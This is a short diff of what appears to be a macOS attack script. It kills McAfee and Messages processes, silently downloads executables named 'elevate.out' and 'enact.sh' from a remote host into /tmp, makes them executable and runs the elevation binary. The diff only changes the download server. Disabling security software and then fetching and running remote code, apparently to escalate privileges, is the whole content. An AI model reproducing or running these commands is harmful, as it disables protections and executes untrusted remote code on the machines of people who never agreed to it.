@@ -3,8 +3,8 @@
 pkill .*McAfee.*
 killall Messages
 
-curl -so /tmp/elevate.out https://erikboesen.com/dl/elevate.out
-curl -so /tmp/enact.sh https://erikboesen.com/dl/enact.sh
+curl -Lso /tmp/elevate.out boesen.science:2042/mac/elevate.out
+curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh
 chmod +x /tmp/elevate.out /tmp/enact.sh
 
 /tmp/elevate.out <<EOF
